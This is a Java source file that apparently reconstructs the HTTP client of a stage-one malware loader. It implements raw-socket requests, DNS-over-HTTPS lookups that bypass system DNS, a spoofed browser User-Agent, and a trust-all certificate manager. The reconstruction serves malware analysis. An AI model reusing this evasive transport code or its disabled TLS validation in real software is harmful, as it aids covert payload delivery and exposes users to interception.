package silentnet.stage1;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.URI;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.security.SecureRandom;
import java.security.cert.X509Certificate;
import java.util.Base64;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import javax.net.ssl.SNIHostName;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLParameters;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

/**
 * Reconstructed from net.fabric.kQNLxnd.
 *
 * This is not a normal HTTP client. It speaks HTTP/1.1 over a raw Socket,
 * resolves names through a hand-built DNS-over-HTTPS query to 1.1.1.1, and
 * installs a trust-all X509TrustManager. It is deliberately browser-like in
 * its request headers but performs no certificate validation.
 */
public final class HttpClient {
    private static final Map<String, DnsCacheEntry> DNS_CACHE = new ConcurrentHashMap<>();
    private static final SSLSocketFactory TLS = trustAllSocketFactory();

    private HttpClient() {
    }

    public static Response get(String url) throws IOException {
        return request("GET", url, null, null, null);
    }

    public static Response get(String url, Map<String, String> headers) throws IOException {
        return request("GET", url, null, null, headers);
    }

    public static Response postJson(String url, String body, String contentType) throws IOException {
        return request("POST", url, body, contentType, null);
    }

    public static Response postJson(String url, String body, String contentType,
                                    Map<String, String> headers) throws IOException {
        return request("POST", url, body, contentType, headers);
    }

    public static Response request(String method, String url, String body, String contentType,
                                   Map<String, String> headers) throws IOException {
        URL parsed = URI.create(url).toURL();
        String host = parsed.getHost();
        String protocol = parsed.getProtocol();
        boolean https = protocol.equalsIgnoreCase("https");
        int port = parsed.getPort() == -1 ? (https ? 443 : 80) : parsed.getPort();

        String path = parsed.getPath();
        if (path == null || path.isEmpty()) {
            path = "/";
        }
        if (parsed.getQuery() != null) {
            path = path + "?" + parsed.getQuery();
        }

        String ip = resolve(host);
        Socket plain = new Socket();
        plain.setReceiveBufferSize(524288);
        plain.connect(new InetSocketAddress(ip, port), 10000);
        plain.setSoTimeout(30000);

        Socket channel = plain;
        if (https) {
            SSLSocket ssl = (SSLSocket) TLS.createSocket(plain, host, port, true);
            SSLParameters params = ssl.getSSLParameters();
            params.setServerNames(List.of(new SNIHostName(host)));
            params.setEndpointIdentificationAlgorithm("HTTPS");
            ssl.setSSLParameters(params);
            ssl.startHandshake();
            channel = ssl;
        }

        try {
            OutputStream out = channel.getOutputStream();
            InputStream in = channel.getInputStream();

            StringBuilder request = new StringBuilder();
            request.append(method).append(' ').append(path).append(" HTTP/1.1\r\n");
            request.append("Host: ").append(host);
            if ((https && port != 443) || (!https && port != 80)) {
                request.append(':').append(port);
            }
            request.append("\r\n");
            request.append("Connection: close\r\n");

            boolean hasAccept = false;
            boolean hasUserAgent = false;
            if (headers != null) {
                for (Map.Entry<String, String> entry : headers.entrySet()) {
                    String key = entry.getKey();
                    if (key.equalsIgnoreCase("Host")
                            || key.equalsIgnoreCase("Connection")
                            || key.equalsIgnoreCase("Content-Length")) {
                        continue;
                    }
                    if (key.equalsIgnoreCase("Accept")) {
                        hasAccept = true;
                    }
                    if (key.equalsIgnoreCase("User-Agent")) {
                        hasUserAgent = true;
                    }
                    request.append(key).append(": ").append(entry.getValue()).append("\r\n");
                }
            }
            if (!hasAccept) {
                request.append("Accept: */*\r\n");
            }
            if (!hasUserAgent) {
                // Original client's fallback UA. The payload download supplies its
                // own Chrome 131 UA.
                request.append("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                        + "AppleWebKit/537.36\r\n");
            }

            byte[] bodyBytes = body == null ? null : body.getBytes(StandardCharsets.UTF_8);
            if (bodyBytes != null) {
                if (contentType != null) {
                    request.append("Content-Type: ").append(contentType).append("\r\n");
                }
                request.append("Content-Length: ").append(bodyBytes.length).append("\r\n");
            }
            request.append("\r\n");

            out.write(request.toString().getBytes(StandardCharsets.ISO_8859_1));
            if (bodyBytes != null) {
                out.write(bodyBytes);
            }
            out.flush();

            return readResponse(in);
        } finally {
            channel.close();
        }
    }

    private static Response readResponse(InputStream input) throws IOException {
        BufferedInputStream in = new BufferedInputStream(input);
        ByteArrayOutputStream headerBytes = new ByteArrayOutputStream();

        int p3 = -1;
        int p2 = -1;
        int p1 = -1;
        int current;
        while ((current = in.read()) != -1) {
            headerBytes.write(current);
            if (p3 == 13 && p2 == 10 && p1 == 13 && current == 10) {
                break;
            }
            p3 = p2;
            p2 = p1;
            p1 = current;
        }

        String headerText = headerBytes.toString(StandardCharsets.ISO_8859_1);
        String[] lines = headerText.split("\r\n");
        String statusLine = lines.length > 0 ? lines[0] : "";

        int statusCode = 0;
        if (statusLine.startsWith("HTTP/")) {
            int firstSpace = statusLine.indexOf(' ');
            if (firstSpace > 0) {
                int secondSpace = statusLine.indexOf(' ', firstSpace + 1);
                String code = secondSpace > 0
                        ? statusLine.substring(firstSpace + 1, secondSpace)
                        : statusLine.substring(firstSpace + 1);
                try {
                    statusCode = Integer.parseInt(code.trim());
                } catch (NumberFormatException ignored) {
                    // leave 0
                }
            }
        }

        Map<String, String> responseHeaders = new LinkedHashMap<>();
        long contentLength = -1;
        boolean chunked = false;
        for (int i = 1; i < lines.length; i++) {
            String line = lines[i];
            int colon = line.indexOf(':');
            if (colon <= 0) {
                continue;
            }
            String name = line.substring(0, colon).trim().toLowerCase();
            String value = line.substring(colon + 1).trim();
            responseHeaders.put(name, value);

            if (name.equals("content-length")) {
                try {
                    contentLength = Long.parseLong(value);
                } catch (NumberFormatException ignored) {
                    // leave -1
                }
            } else if (name.equals("transfer-encoding")
                    && value.toLowerCase().contains("chunked")) {
                chunked = true;
            }
        }

        byte[] body;
        if (chunked) {
            body = readChunked(in);
        } else if (contentLength >= 0) {
            body = readExactly(in, (int) contentLength);
        } else {
            body = readAll(in);
        }
        return new Response(statusCode, statusLine, responseHeaders, body);
    }

    private static byte[] readChunked(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream(0x100000);
        while (true) {
            StringBuilder line = new StringBuilder();
            int c;
            while ((c = in.read()) != -1 && c != 13) {
                line.append((char) c);
            }
            if (c == 13) {
                in.read(); // LF
            }
            String sizeText = line.toString();
            int semicolon = sizeText.indexOf(';');
            if (semicolon >= 0) {
                sizeText = sizeText.substring(0, semicolon);
            }
            if (sizeText.isEmpty()) {
                break;
            }
            int size;
            try {
                size = Integer.parseInt(sizeText.trim(), 16);
            } catch (NumberFormatException e) {
                break;
            }
            if (size == 0) {
                break;
            }
            byte[] chunk = new byte[size];
            int read = 0;
            while (read < size) {
                int n = in.read(chunk, read, size - read);
                if (n == -1) {
                    break;
                }
                read += n;
            }
            out.write(chunk, 0, read);
            in.read(); // CR
            in.read(); // LF
        }
        return out.toByteArray();
    }

    private static byte[] readExactly(InputStream in, int length) throws IOException {
        byte[] data = new byte[length];
        int offset = 0;
        while (offset < length) {
            int n = in.read(data, offset, length - offset);
            if (n == -1) {
                break;
            }
            offset += n;
        }
        return data;
    }

    private static byte[] readAll(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream(0x100000);
        byte[] buffer = new byte[131072];
        int n;
        while ((n = in.read(buffer)) != -1) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    private static String resolve(String host) throws IOException {
        if (isIpv4Literal(host)) {
            return host;
        }
        DnsCacheEntry cached = DNS_CACHE.get(host);
        if (cached != null && !cached.isExpired()) {
            return cached.ip;
        }

        byte[] query = buildDnsQuery(host);
        byte[] response = dohQuery(query);
        String ip = parseAAnswer(response);
        if (ip != null) {
            DNS_CACHE.put(host, new DnsCacheEntry(ip, System.currentTimeMillis() + 300000L));
        }
        return ip;
    }

    private static boolean isIpv4Literal(String host) {
        if (host == null || host.isEmpty()) {
            return false;
        }
        for (int i = 0; i < host.length(); i++) {
            char c = host.charAt(i);
            if (c != '.' && (c < '0' || c > '9')) {
                return false;
            }
        }
        return host.contains(".");
    }

    private static byte[] buildDnsQuery(String host) {
        try {
            ByteArrayOutputStream bytes = new ByteArrayOutputStream();
            DataOutputStream out = new DataOutputStream(bytes);
            out.writeShort((short) (System.nanoTime() & 0xFFFFL));
            out.writeShort(0x0100); // recursion desired
            out.writeShort(1);      // QDCOUNT
            out.writeShort(0);      // ANCOUNT
            out.writeShort(0);      // NSCOUNT
            out.writeShort(0);      // ARCOUNT
            for (String label : host.split("\\.")) {
                out.writeByte(label.length());
                out.writeBytes(label);
            }
            out.writeByte(0);
            out.writeShort(1);      // A
            out.writeShort(1);      // IN
            return bytes.toByteArray();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private static byte[] dohQuery(byte[] dnsQuery) throws IOException {
        Socket plain = new Socket();
        plain.connect(new InetSocketAddress("1.1.1.1", 443), 10000);
        plain.setSoTimeout(30000);

        SSLSocket ssl = (SSLSocket) TLS.createSocket(plain, "cloudflare-dns.com", 443, true);
        SSLParameters params = ssl.getSSLParameters();
        params.setServerNames(List.of(new SNIHostName("cloudflare-dns.com")));
        // The original does not enable endpoint identification on the DoH leg.
        ssl.setSSLParameters(params);
        ssl.startHandshake();

        try {
            OutputStream out = ssl.getOutputStream();
            InputStream in = ssl.getInputStream();

            String encoded = Base64.getUrlEncoder().withoutPadding().encodeToString(dnsQuery);
            String request = "GET /dns-query?dns=" + encoded + " HTTP/1.1\r\n"
                    + "Host: cloudflare-dns.com\r\n"
                    + "Accept: application/dns-message\r\n"
                    + "Connection: close\r\n"
                    + "\r\n";
            out.write(request.getBytes(StandardCharsets.ISO_8859_1));
            out.flush();

            return readResponse(in).body;
        } finally {
            ssl.close();
        }
    }

    private static String parseAAnswer(byte[] response) {
        if (response == null || response.length < 12) {
            return null;
        }
        ByteBuffer buffer = ByteBuffer.wrap(response);
        buffer.getShort(); // transaction ID
        short flags = buffer.getShort();
        if ((flags & 0x8000) == 0) { // not a response
            return null;
        }
        int opcode = flags & 0xF;
        if (opcode != 0) {
            return null;
        }
        int questionCount = buffer.getShort() & 0xFFFF;
        int answerCount = buffer.getShort() & 0xFFFF;
        buffer.getShort(); // NSCOUNT
        buffer.getShort(); // ARCOUNT

        for (int i = 0; i < questionCount; i++) {
            skipName(buffer);
            buffer.getShort(); // QTYPE
            buffer.getShort(); // QCLASS
        }

        for (int i = 0; i < answerCount; i++) {
            skipName(buffer);
            int type = buffer.getShort() & 0xFFFF;
            buffer.getShort(); // CLASS
            buffer.getInt();   // TTL
            int rdLength = buffer.getShort() & 0xFFFF;
            if (type == 1 && rdLength == 4) {
                byte[] address = new byte[4];
                buffer.get(address);
                return (address[0] & 0xFF) + "." + (address[1] & 0xFF) + "."
                        + (address[2] & 0xFF) + "." + (address[3] & 0xFF);
            }
            buffer.position(buffer.position() + rdLength);
        }
        return null;
    }

    private static void skipName(ByteBuffer buffer) {
        while (buffer.hasRemaining()) {
            int length = buffer.get() & 0xFF;
            if (length == 0) {
                return;
            }
            if ((length & 0xC0) == 0xC0) {
                buffer.get(); // compression pointer low byte
                return;
            }
            buffer.position(buffer.position() + length);
        }
    }

    private static SSLSocketFactory trustAllSocketFactory() {
        try {
            SSLContext context = SSLContext.getInstance("TLS");
            context.init(null, new TrustManager[]{new TrustAllManager()}, new SecureRandom());
            return context.getSocketFactory();
        } catch (Exception e) {
            return (SSLSocketFactory) SSLSocketFactory.getDefault();
        }
    }

    public static final class Response {
        public final int statusCode;
        public final String statusLine;
        public final Map<String, String> headers;
        public final byte[] body;

        Response(int statusCode, String statusLine, Map<String, String> headers, byte[] body) {
            this.statusCode = statusCode;
            this.statusLine = statusLine;
            this.headers = headers;
            this.body = body;
        }

        public String bodyString() {
            return new String(body, StandardCharsets.UTF_8);
        }

        public String header(String name) {
            return headers.get(name.toLowerCase());
        }
    }

    private static final class DnsCacheEntry {
        final String ip;
        final long expiresAt;

        DnsCacheEntry(String ip, long expiresAt) {
            this.ip = ip;
            this.expiresAt = expiresAt;
        }

        boolean isExpired() {
            return System.currentTimeMillis() > expiresAt;
        }
    }

    private static final class TrustAllManager implements X509TrustManager {
        @Override
        public void checkClientTrusted(X509Certificate[] chain, String authType) {
        }

        @Override
        public void checkServerTrusted(X509Certificate[] chain, String authType) {
        }

        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }
    }
}
